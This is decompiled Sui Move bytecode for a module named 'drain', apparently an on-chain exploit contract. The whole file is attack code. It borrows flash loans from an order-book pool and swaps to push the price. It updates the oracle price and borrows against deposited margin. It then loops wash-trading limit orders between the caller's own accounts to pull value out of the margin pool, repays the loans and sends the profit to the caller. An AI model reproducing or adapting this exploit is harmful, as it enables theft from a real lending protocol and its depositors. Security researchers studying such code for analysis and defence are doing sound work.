module 0x5e001bcdbfb561f6cbe45a86c35aa6cb855a9dd9d2367f8303b6c9ba015745c7::drain {
    public fun execute<T0, T1>(arg0: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<T0, T1>, arg1: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_registry::MarginRegistry, arg2: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::MarginManager<T0, T1>, arg3: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::BalanceManager, arg4: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_pool::MarginPool<T1>, arg5: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg6: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg7: u64, arg8: &0x2::clock::Clock, arg9: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::pool_book_params<T0, T1>(arg0);
        let (v3, v4, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::vault_balances<T0, T1>(arg0);
        assert!(v3 > 0, 100);
        assert!(v4 > 0, 101);
        let v6 = v3 * 55 / 100 / v1 * v1;
        let v7 = v4 * 20 / 100;
        assert!(v6 > 0, 102);
        assert!(v7 > 0, 103);
        let v8 = v7 * 45 / 100;
        let v9 = v7 * 45 / 100;
        let v10 = v8 * 4;
        assert!(v8 > 0, 401);
        assert!(v10 > 0, 402);
        let (v11, v12) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<T0, T1>(arg0, v6, arg9);
        let v13 = v11;
        let (v14, v15) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_quote<T0, T1>(arg0, v7, arg9);
        let v16 = v14;
        let (v17, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::vault_balances<T0, T1>(arg0);
        let v20 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::mid_price<T0, T1>(arg0, arg8);
        let v21 = if (v20 > 0) {
            v17 / 1000000 * v20 / 1000 * 80 / 100
        } else {
            0
        };
        let v22 = if (v9 < v21) {
            v9
        } else {
            v21
        };
        assert!(v22 > 0, 200);
        assert!(0x2::coin::value<T1>(&v16) >= v22, 201);
        let (v23, v24, v25) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v16, v22, arg9), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg9), 0, arg8, arg9);
        0x2::coin::join<T0>(&mut v13, v23);
        0x2::coin::join<T1>(&mut v16, v24);
        0x2::coin::destroy_zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(v25);
        let v26 = v6 * 15 / 100 / v1 * v1;
        if (v26 > 0) {
            assert!(0x2::coin::value<T0>(&v13) >= v26, 202);
            let (v27, v28, v29) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_base_for_quote<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v13, v26, arg9), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg9), 0, arg8, arg9);
            0x2::coin::join<T0>(&mut v13, v27);
            0x2::coin::join<T1>(&mut v16, v28);
            0x2::coin::destroy_zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(v29);
        };
        let (_, _, v32, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg8);
        let v34 = v32;
        let (v35, _, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg8);
        let v39 = v35;
        assert!(!0x1::vector::is_empty<u64>(&v34), 300);
        assert!(!0x1::vector::is_empty<u64>(&v39), 301);
        let v40 = (*0x1::vector::borrow<u64>(&v34, 0) - v0) / v0 * v0;
        let v41 = (*0x1::vector::borrow<u64>(&v39, 0) + v0) / v0 * v0;
        assert!(v40 > v41, 302);
        assert!(0x2::coin::value<T1>(&v16) >= v8, 400);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::update_current_price<T0, T1>(arg1, arg0, arg5, arg6, arg8);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::deposit<T0, T1, T1>(arg2, arg1, arg5, arg6, 0x2::coin::split<T1>(&mut v16, v8, arg9), arg8, arg9);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::borrow_quote<T0, T1>(arg2, arg1, arg4, arg5, arg6, arg0, v10, arg8, arg9);
        let v42 = 0x2::coin::value<T0>(&v13);
        assert!(v42 > 0, 500);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::deposit<T0>(arg3, v13, arg9);
        let v43 = v42 * 85 / 100 / v1 * v1;
        let v44 = v43 * 999 / 1000 / v1 * v1;
        assert!(v43 > 0, 501);
        assert!(v44 > 0, 502);
        let v45 = 0;
        while (v45 < arg7) {
            let v46 = v45 * 10;
            let v47 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v47, v46, 0, 0, v40, v43, false, false, 18446744073709551615, arg8, arg9);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v46 + 1, 1, 0, v40, v43, true, false, 18446744073709551615, arg8, arg9);
            let v48 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v48, arg8, arg9);
            let v49 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v49);
            assert!(0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::balance<T1>(arg3) > 0, 600);
            let v50 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v50, v46 + 2, 0, 0, v41, v44, true, false, 18446744073709551615, arg8, arg9);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v46 + 3, 1, 0, v41, v44, false, false, 18446744073709551615, arg8, arg9);
            let v51 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v51, arg8, arg9);
            let v52 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v52);
            v45 = v45 + 1;
        };
        let v53 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v53, arg8, arg9);
        let v54 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg9);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v54);
        let v55 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T0>(arg3, arg9);
        let v56 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T1>(arg3, arg9);
        let v57 = 0x2::coin::value<T1>(&v56) / 50;
        if (v57 > 0) {
            let (v58, v59, v60) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v56, v57, arg9), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg9), 0, arg8, arg9);
            0x2::coin::join<T0>(&mut v55, v58);
            0x2::coin::join<T1>(&mut v56, v59);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v60, 0x2::tx_context::sender(arg9));
        };
        assert!(0x2::coin::value<T0>(&v55) >= v6, 700);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v55, v6, arg9), v12);
        0x2::coin::join<T1>(&mut v56, v16);
        assert!(0x2::coin::value<T1>(&v56) >= v7, 701);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_quote<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v56, v7, arg9), v15);
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v55, 0x2::tx_context::sender(arg9));
        0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(v56, 0x2::tx_context::sender(arg9));
    }

    // decompiled from Move bytecode v7
}

